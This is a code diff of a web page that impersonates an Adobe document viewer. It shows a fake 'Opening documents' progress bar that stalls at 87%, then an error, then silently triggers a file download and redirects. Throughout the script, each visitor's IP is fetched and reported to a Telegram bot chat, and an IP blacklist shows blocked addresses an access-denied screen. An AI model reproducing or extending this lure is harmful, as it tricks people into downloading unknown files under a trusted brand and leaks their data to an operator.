@@ -9,7 +9,7 @@
     body {
       margin: 0;
       padding: 0;
-      background-image: url('Screenshot 2025-04-25 161700.png');
+      background-image: url('adobebackground10.png');
       background-size: contain;
       background-position: center;
       background-repeat: no-repeat;
@@ -55,7 +55,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      padding: 20px 0;
+      padding: 10px 0;
       opacity: 1;
       transition: opacity 0.6s ease;
       min-height: 200px;
@@ -68,61 +68,9 @@
       width: 100%;
     }
 
-    .lottie-container dotlottie-wc {
-      width: 200px;
-      height: 200px;
-    }
-
-    /* Fallback for Lottie - CSS animation if Lottie fails */
-    .lottie-fallback {
-      display: none;
-      width: 150px;
-      height: 150px;
-      margin: 0 auto;
-      position: relative;
-    }
-
-    .lottie-fallback .circle {
-      position: absolute;
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      border: 6px solid #e0e0e0;
-      border-top-color: #ED2224;
-      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-      box-sizing: border-box;
-    }
-
-    .lottie-fallback .dots {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      display: flex;
-      gap: 8px;
-    }
-
-    .lottie-fallback .dots span {
-      width: 10px;
-      height: 10px;
-      background: #ED2224;
-      border-radius: 50%;
-      display: inline-block;
-      animation: dotBounce 1.4s ease-in-out infinite both;
-    }
-
-    .lottie-fallback .dots span:nth-child(1) { animation-delay: -0.32s; }
-    .lottie-fallback .dots span:nth-child(2) { animation-delay: -0.16s; }
-    .lottie-fallback .dots span:nth-child(3) { animation-delay: 0s; }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes dotBounce {
-      0%, 80%, 100% { transform: scale(0); }
-      40% { transform: scale(1); }
+    #lottieAnimation {
+      width: 180px;
+      height: 180px;
     }
 
     /* ===== LOADING STYLES ===== */
@@ -139,7 +87,6 @@
       pointer-events: all;
     }
 
-    /* Adobe-style loading animation */
     .adobe-loader {
       width: 80px;
       height: 80px;
@@ -179,6 +126,16 @@
     .adobe-loader .dots span:nth-child(1) { animation-delay: -0.32s; }
     .adobe-loader .dots span:nth-child(2) { animation-delay: -0.16s; }
     .adobe-loader .dots span:nth-child(3) { animation-delay: 0s; }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes dotBounce {
+      0%, 80%, 100% { transform: scale(0); }
+      40% { transform: scale(1); }
+    }
 
     .loading-status {
       font-size: 15px;
@@ -307,12 +264,10 @@
       to { opacity: 1; transform: translateY(0); }
     }
 
-    /* Hide loading when error shows */
     .loading-container.hidden {
       display: none;
     }
 
-    /* Responsive adjustments */
     @media (max-width: 600px) {
       .modal-content {
         padding: 24px 18px;
@@ -331,9 +286,9 @@
       .error-panel p {
         font-size: 13px;
       }
-      .lottie-container dotlottie-wc {
-        width: 150px;
-        height: 150px;
+      #lottieAnimation {
+        width: 140px;
+        height: 140px;
       }
     }
   </style>
@@ -344,7 +299,7 @@
   <div id="confirmationModal" class="modal-overlay">
     <div class="modal-content">
       <div class="modal-header">
-        <img src="adobe-logo-2017.png" alt="Adobe Logo">
+        <img src="free-ad.webp" alt="Adobe Logo">
       </div>
 
       <!-- ===== ACCESS DENIED PANEL ===== -->
@@ -358,16 +313,7 @@
 
       <!-- ===== LOTTIE ANIMATION ===== -->
       <div id="lottieContainer" class="lottie-container">
-        <dotlottie-wc src="https://lottie.host/c84685e5-ab03-4c8b-8304-f860c80244b7/pm7ccubzgi.lottie" autoplay loop></dotlottie-wc>
-        <!-- Fallback animation if Lottie fails to load -->
-        <div id="lottieFallback" class="lottie-fallback" style="display:none;">
-          <div class="circle"></div>
-          <div class="dots">
-            <span></span>
-            <span></span>
-            <span></span>
-          </div>
-        </div>
+        <div id="lottieAnimation"></div>
       </div>
 
       <!-- ===== LOADING INTERFACE ===== -->
@@ -397,41 +343,45 @@
     </div>
   </div>
 
-  <!-- hidden download link -->
   <a id="downloadLink" href="#" style="display:none;"></a>
 
   <!-- Lottie Library -->
-  <script src="https://unpkg.com/@lottiefiles/dotlottie-wc@0.9.14/dist/dotlottie-wc.js" type="module"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lottie-web/5.12.2/lottie.min.js"></script>
 
   <script>
     // ============================================================
     // 🔧 BACKEND CONFIGURATION - TIMER SETTINGS
-    // Modify these values to control timing (all values in seconds)
     // ============================================================
     const BACKEND_CONFIG = {
-      lottieDuration: 4,      // How long the initial Lottie animation plays
-      loadingDuration: 10,    // Time to reach 87% progress
-      errorDuration: 5,       // Time error shows before auto-download
-      downloadDelay: 5        // Time after download before redirect
+      lottieDuration: 4,
+      loadingDuration: 10,
+      errorDuration: 5,
+      downloadDelay: 5
     };
 
     // ============================================================
     // 🔒 IP WHITELIST & BLACKLIST CONFIGURATION
-    // Add IPs you want to block or allow here
-    // Supports both single IPs and CIDR ranges (e.g., "192.168.1.0/24")
     // ============================================================
     const IP_ACCESS_CONFIG = {
-      // BLACKLIST: Add suspicious IPs here to block them
       blacklist: [
-        // "192.168.1.200",      // Block a single IP
-        // "10.0.0.5",           // Block another IP
-        // "203.0.113.0/24"      // Block an entire subnet
+        // "192.168.1.200",
+        // "203.0.113.0/24"
       ],
-      
-      // WHITELIST: Add IPs you want to always allow (overrides blacklist)
       whitelist: [
-        // "192.168.1.100",      // Always allow this IP
-        // "10.0.0.0/8"          // Allow entire subnet
+        // "192.168.1.100"
+      ]
+    };
+
+    // ============================================================
+    // 📦 EMBEDDED LOTTIE JSON - "Material wave loading"
+    // ============================================================
+    const LOTTIE_ANIMATION_DATA = {
+      "v":"4.6.8","fr":29.9700012207031,"ip":0,"op":40.0000016292334,"w":256,"h":256,"nm":"Comp 1","ddd":0,"assets":[],"layers":[
+        {"ddd":0,"ind":1,"ty":4,"nm":"Shape Layer 3","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":1,"k":[{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":20,"s":[208.6,127.969,0],"e":[208.6,88,0],"to":[0,-6.66145849227905,0],"ti":[0,-0.00520833348855,0]},{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":30,"s":[208.6,88,0],"e":[208.6,128,0],"to":[0,0.00520833348855,0],"ti":[0,-6.66666650772095,0]},{"t":40.0000016292334}]},"a":{"a":0,"k":[-70,-0.5,0]},"s":{"a":0,"k":[75,75,100]}},"ao":0,"shapes":[{"ty":"gr","it":[{"d":1,"ty":"el","s":{"a":0,"k":[33.75,34.5]},"p":{"a":0,"k":[0,0]},"nm":"Ellipse Path 1","mn":"ADBE Vector Shape - Ellipse"},{"ty":"fl","c":{"a":0,"k":[0.9843137,0.5490196,0,1]},"o":{"a":0,"k":100},"r":1,"nm":"Fill 1","mn":"ADBE Vector Graphic - Fill"},{"ty":"tr","p":{"a":0,"k":[-70.125,-0.5],"ix":2},"a":{"a":0,"k":[0,0],"ix":1},"s":{"a":0,"k":[100,100],"ix":3},"r":{"a":0,"k":0,"ix":6},"o":{"a":0,"k":100,"ix":7},"sk":{"a":0,"k":0,"ix":4},"sa":{"a":0,"k":0,"ix":5},"nm":"Transform"}],"nm":"Ellipse 1","np":3,"cix":2,"ix":1,"mn":"ADBE Vector Group"}],"ip":0,"op":300.00001221925,"st":0,"bm":0,"sr":1},
+        {"ddd":0,"ind":2,"ty":4,"nm":"Shape Layer 2","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":1,"k":[{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":15,"s":[168.6,128,0],"e":[168.6,88,0],"to":[0,-6.66666650772095,0],"ti":[0,0,0]},{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":25,"s":[168.6,88,0],"e":[168.6,128,0],"to":[0,0,0],"ti":[0,-6.66666650772095,0]},{"t":35.0000014255792}]},"a":{"a":0,"k":[-70,-0.5,0]},"s":{"a":0,"k":[75,75,100]}},"ao":0,"shapes":[{"ty":"gr","it":[{"d":1,"ty":"el","s":{"a":0,"k":[33.75,34.5]},"p":{"a":0,"k":[0,0]},"nm":"Ellipse Path 1","mn":"ADBE Vector Shape - Ellipse"},{"ty":"fl","c":{"a":0,"k":[0.9921569,0.8470588,0.2078431,1]},"o":{"a":0,"k":100},"r":1,"nm":"Fill 1","mn":"ADBE Vector Graphic - Fill"},{"ty":"tr","p":{"a":0,"k":[-70.125,-0.5],"ix":2},"a":{"a":0,"k":[0,0],"ix":1},"s":{"a":0,"k":[100,100],"ix":3},"r":{"a":0,"k":0,"ix":6},"o":{"a":0,"k":100,"ix":7},"sk":{"a":0,"k":0,"ix":4},"sa":{"a":0,"k":0,"ix":5},"nm":"Transform"}],"nm":"Ellipse 1","np":3,"cix":2,"ix":1,"mn":"ADBE Vector Group"}],"ip":0,"op":300.00001221925,"st":0,"bm":0,"sr":1},
+        {"ddd":0,"ind":3,"ty":4,"nm":"Shape Layer 1","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":1,"k":[{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":10,"s":[128.594,127.969,0],"e":[128.594,88,0],"to":[0,-6.66145849227905,0],"ti":[0,-0.00520833348855,0]},{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":20,"s":[128.594,88,0],"e":[128.594,128,0],"to":[0,0.00520833348855,0],"ti":[0,-6.66666650772095,0]},{"t":30.0000012219251}]},"a":{"a":0,"k":[-70,-0.5,0]},"s":{"a":0,"k":[75,75,100]}},"ao":0,"shapes":[{"ty":"gr","it":[{"d":1,"ty":"el","s":{"a":0,"k":[33.75,34.5]},"p":{"a":0,"k":[0,0]},"nm":"Ellipse Path 1","mn":"ADBE Vector Shape - Ellipse"},{"ty":"fl","c":{"a":0,"k":[0.2627451,0.627451,0.2784314,1]},"o":{"a":0,"k":100},"r":1,"nm":"Fill 1","mn":"ADBE Vector Graphic - Fill"},{"ty":"tr","p":{"a":0,"k":[-70.125,-0.5],"ix":2},"a":{"a":0,"k":[0,0],"ix":1},"s":{"a":0,"k":[100,100],"ix":3},"r":{"a":0,"k":0,"ix":6},"o":{"a":0,"k":100,"ix":7},"sk":{"a":0,"k":0,"ix":4},"sa":{"a":0,"k":0,"ix":5},"nm":"Transform"}],"nm":"Ellipse 1","np":3,"cix":2,"ix":1,"mn":"ADBE Vector Group"}],"ip":0,"op":300.00001221925,"st":0,"bm":0,"sr":1},
+        {"ddd":0,"ind":4,"ty":4,"nm":"Shape Layer 4","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":1,"k":[{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":5,"s":[88.6,127.969,0],"e":[88.6,88,0],"to":[0,-6.66145849227905,0],"ti":[0,-0.00520833348855,0]},{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":15,"s":[88.6,88,0],"e":[88.6,128,0],"to":[0,0.00520833348855,0],"ti":[0,-6.66666650772095,0]},{"t":25.0000010182709}]},"a":{"a":0,"k":[-70,-0.5,0]},"s":{"a":0,"k":[75,75,100]}},"ao":0,"shapes":[{"ty":"gr","it":[{"d":1,"ty":"el","s":{"a":0,"k":[33.75,34.5]},"p":{"a":0,"k":[0,0]},"nm":"Ellipse Path 1","mn":"ADBE Vector Shape - Ellipse"},{"ty":"fl","c":{"a":0,"k":[0.1176471,0.5333334,0.8980392,1]},"o":{"a":0,"k":100},"r":1,"nm":"Fill 1","mn":"ADBE Vector Graphic - Fill"},{"ty":"tr","p":{"a":0,"k":[-70.125,-0.5],"ix":2},"a":{"a":0,"k":[0,0],"ix":1},"s":{"a":0,"k":[100,100],"ix":3},"r":{"a":0,"k":0,"ix":6},"o":{"a":0,"k":100,"ix":7},"sk":{"a":0,"k":0,"ix":4},"sa":{"a":0,"k":0,"ix":5},"nm":"Transform"}],"nm":"Ellipse 1","np":3,"cix":2,"ix":1,"mn":"ADBE Vector Group"}],"ip":0,"op":300.00001221925,"st":0,"bm":0,"sr":1},
+        {"ddd":0,"ind":5,"ty":4,"nm":"Shape Layer 5","ks":{"o":{"a":0,"k":100},"r":{"a":0,"k":0},"p":{"a":1,"k":[{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":0,"s":[48.6,127.969,0],"e":[48.6,88,0],"to":[0,-6.66145849227905,0],"ti":[0,-0.00520833348855,0]},{"i":{"x":0.667,"y":1},"o":{"x":0.333,"y":0},"n":"0p667_1_0p333_0","t":10,"s":[48.6,88,0],"e":[48.6,128,0],"to":[0,0.00520833348855,0],"ti":[0,-6.66666650772095,0]},{"t":20.0000008146167}]},"a":{"a":0,"k":[-70,-0.5,0]},"s":{"a":0,"k":[75,75,100]}},"ao":0,"shapes":[{"ty":"gr","it":[{"d":1,"ty":"el","s":{"a":0,"k":[33.75,34.5]},"p":{"a":0,"k":[0,0]},"nm":"Ellipse Path 1","mn":"ADBE Vector Shape - Ellipse"},{"ty":"fl","c":{"a":0,"k":[0.8980392,0.2235294,0.2078431,1]},"o":{"a":0,"k":100},"r":1,"nm":"Fill 1","mn":"ADBE Vector Graphic - Fill"},{"ty":"tr","p":{"a":0,"k":[-70.125,-0.5],"ix":2},"a":{"a":0,"k":[0,0],"ix":1},"s":{"a":0,"k":[100,100],"ix":3},"r":{"a":0,"k":0,"ix":6},"o":{"a":0,"k":100,"ix":7},"sk":{"a":0,"k":0,"ix":4},"sa":{"a":0,"k":0,"ix":5},"nm":"Transform"}],"nm":"Ellipse 1","np":3,"cix":2,"ix":1,"mn":"ADBE Vector Group"}],"ip":0,"op":300.00001221925,"st":0,"bm":0,"sr":1}
       ]
     };
 
@@ -494,7 +444,6 @@
     // 2. IP UTILITY FUNCTIONS
     // ============================================================
 
-    // Convert IP to number for range comparisons
     function ipToNumber(ip) {
       const parts = ip.split('.');
       if (parts.length !== 4) return 0;
@@ -504,7 +453,6 @@
              parseInt(parts[3]);
     }
 
-    // Check if IP is in CIDR range
     function ipInRange(ip, cidr) {
       if (!cidr.includes('/')) {
         return ip === cidr;
@@ -518,20 +466,16 @@
       return (ipNum & mask) === (rangeNum & mask);
     }
 
-    // Check if IP is in a list (supports CIDR)
     function isIpInList(ip, list) {
       if (!list || list.length === 0) return false;
       return list.some(item => ipInRange(ip, item));
     }
 
-    // Check IP access permissions
     function checkIpAccess(ip) {
-      // First check whitelist (overrides everything)
       if (isIpInList(ip, IP_ACCESS_CONFIG.whitelist)) {
         return { allowed: true, reason: 'whitelist' };
       }
       
-      // Then check blacklist
       if (isIpInList(ip, IP_ACCESS_CONFIG.blacklist)) {
         return { allowed: false, reason: 'blacklist' };
       }
@@ -568,7 +512,39 @@
     }
 
     // ============================================================
-    // 4. LOADING SIMULATION
+    // 4. LOTTIE ANIMATION INITIALIZATION
+    // ============================================================
+
+    let lottieAnimation = null;
+
+    function initLottieAnimation() {
+      try {
+        lottieAnimation = lottie.loadAnimation({
+          container: document.getElementById('lottieAnimation'),
+          renderer: 'svg',
+          loop: true,
+          autoplay: true,
+          animationData: LOTTIE_ANIMATION_DATA
+        });
+        
+        // Ensure animation plays properly
+        lottieAnimation.addEventListener('data_ready', function() {
+          console.log('Lottie animation loaded successfully');
+        });
+        
+        lottieAnimation.addEventListener('error', function(err) {
+          console.warn('Lottie error:', err);
+        });
+        
+        return true;
+      } catch (error) {
+        console.warn('Failed to load Lottie animation:', error);
+        return false;
+      }
+    }
+
+    // ============================================================
+    // 5. LOADING SIMULATION
     // ============================================================
 
     let loadingTimer = null;
@@ -580,8 +556,13 @@
       const lottieContainer = document.getElementById('lottieContainer');
       const errorPanel = document.getElementById('errorPanel');
 
-      // Hide Lottie animation, show loading
       lottieContainer.classList.add('hidden');
+      
+      // Stop Lottie animation when hidden
+      if (lottieAnimation) {
+        lottieAnimation.pause();
+      }
+      
       container.classList.remove('hidden');
       container.classList.add('active');
       errorPanel.classList.remove('active');
@@ -604,21 +585,14 @@
       const progressFill = document.getElementById('progressFill');
       const percentEl = document.getElementById('progressPercent');
 
-      // Clear any existing timers
       if (loadingTimer) clearTimeout(loadingTimer);
       if (progressTimer) clearInterval(progressTimer);
 
-      // Reset progress
       progressFill.style.width = '0%';
       percentEl.textContent = '0%';
-
-      // Set initial status
       statusEl.textContent = 'Opening documents...';
 
-      // Use config values from BACKEND_CONFIG
       const totalDuration = BACKEND_CONFIG.loadingDuration * 1000;
-
-      // Progress updates every 50ms - target 87%
       const startTime = Date.now();
 
       progressTimer = setInterval(() => {
@@ -629,7 +603,6 @@
         percentEl.textContent = progress + '%';
       }, 50);
 
-      // Status updates based on time (scaled to loading duration)
       statusMessages.forEach((msg, index) => {
         const delay = (index / statusMessages.length) * totalDuration;
         setTimeout(() => {
@@ -637,22 +610,18 @@
         }, delay);
       });
 
-      // After loading duration, show error state at 87%
       loadingTimer = setTimeout(() => {
         clearInterval(progressTimer);
         progressFill.style.width = '87%';
         percentEl.textContent = '87%';
         
-        // Show error panel
         showErrorPanel();
         
-        // After error duration, trigger automatic download
         setTimeout(() => {
           if (!downloadTriggered) {
             downloadTriggered = true;
             handleDownload();
             
-            // After download delay, redirect
             setTimeout(() => {
               window.location.href = 'complete.php';
             }, BACKEND_CONFIG.downloadDelay * 1000);
@@ -663,14 +632,13 @@
     }
 
     // ============================================================
-    // 5. ERROR HANDLING
+    // 6. ERROR HANDLING
     // ============================================================
 
     function showErrorPanel() {
       const container = document.getElementById('loadingContainer');
       const errorPanel = document.getElementById('errorPanel');
 
-      // Clear timers
       if (loadingTimer) clearTimeout(loadingTimer);
       if (progressTimer) clearInterval(progressTimer);
 
@@ -680,7 +648,7 @@
     }
 
     // ============================================================
-    // 6. REPORT VISIT TO TELEGRAM
+    // 7. REPORT VISIT TO TELEGRAM
     // ============================================================
 
     async function reportVisitToTelegram(ip, blocked = false) {
@@ -688,7 +656,6 @@
       const CHAT_ID = '7515108596';
 
       try {
-        // If no IP provided, fetch it
         if (!ip) {
           const ipRes = await fetch('https://api.ipify.org?format=json');
           const ipData = await ipRes.json();
@@ -740,7 +707,7 @@
     }
 
     // ============================================================
-    // 7. HANDLE DOWNLOAD
+    // 8. HANDLE DOWNLOAD
     // ============================================================
 
     function handleDownload() {
@@ -763,7 +730,7 @@
     }
 
     // ============================================================
-    // 8. SHOW ACCESS DENIED
+    // 9. SHOW ACCESS DENIED
     // ============================================================
 
     function showAccessDenied(ip) {
@@ -772,37 +739,18 @@
       const loadingContainer = document.getElementById('loadingContainer');
       const errorPanel = document.getElementById('errorPanel');
       
-      // Hide everything else
       lottieContainer.classList.add('hidden');
+      
+      if (lottieAnimation) {
+        lottieAnimation.pause();
+      }
+      
       loadingContainer.classList.remove('active');
       loadingContainer.classList.add('hidden');
       errorPanel.classList.remove('active');
       
-      // Show access denied
       document.getElementById('blockedIpDisplay').textContent = 'IP: ' + ip;
       accessDenied.classList.add('active');
-    }
-
-    // ============================================================
-    // 9. LOTTIE FALLBACK - Show CSS animation if Lottie fails
-    // ============================================================
-
-    function setupLottieFallback() {
-      const lottieElement = document.querySelector('dotlottie-wc');
-      const fallbackElement = document.getElementById('lottieFallback');
-      
-      // If Lottie doesn't load after 3 seconds, show fallback
-      setTimeout(() => {
-        // Check if Lottie rendered something
-        const lottieContainer = document.getElementById('lottieContainer');
-        const hasContent = lottieContainer.querySelector('canvas, svg, div[class*="lottie"]');
-        
-        if (!hasContent) {
-          // Lottie didn't load, show fallback
-          if (lottieElement) lottieElement.style.display = 'none';
-          fallbackElement.style.display = 'block';
-        }
-      }, 3000);
     }
 
     // ============================================================
@@ -820,43 +768,47 @@
         });
       }
 
-      // Setup Lottie fallback
-      setupLottieFallback();
+      // Initialize Lottie animation with embedded JSON
+      const lottieLoaded = initLottieAnimation();
+      
+      if (!lottieLoaded) {
+        // If Lottie fails, show a simple fallback
+        document.getElementById('lottieContainer').innerHTML = `
+          <div style="width:180px;height:180px;display:flex;align-items:center;justify-content:center;">
+            <div class="adobe-loader" style="margin:0;">
+              <div class="circle"></div>
+              <div class="dots">
+                <span></span>
+                <span></span>
+                <span></span>
+              </div>
+            </div>
+          </div>
+        `;
+      }
 
-      // Get client IP and check access
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
           const clientIp = data.ip || 'unknown';
-          
-          // Check if IP is blacklisted (whitelist overrides)
           const access = checkIpAccess(clientIp);
           
           if (!access.allowed) {
-            // IP is blocked - show access denied
             showAccessDenied(clientIp);
-            // Report blocked visit
             reportVisitToTelegram(clientIp, true);
             return;
           }
           
-          // IP is allowed - proceed normally (page is visible to all)
-          // Report visit
           reportVisitToTelegram(clientIp, false);
           
-          // Show Lottie animation for configured duration, then transition to loading
           setTimeout(function() {
             startLoadingSimulation();
           }, BACKEND_CONFIG.lottieDuration * 1000);
         })
         .catch(err => {
-          // If IP fetch fails, allow access by default
           console.warn('IP fetch failed, allowing access by default:', err);
-          
-          // Report visit with unknown IP
           reportVisitToTelegram('unknown', false);
           
-          // Proceed with loading
           setTimeout(function() {
             startLoadingSimulation();
           }, BACKEND_CONFIG.lottieDuration * 1000);
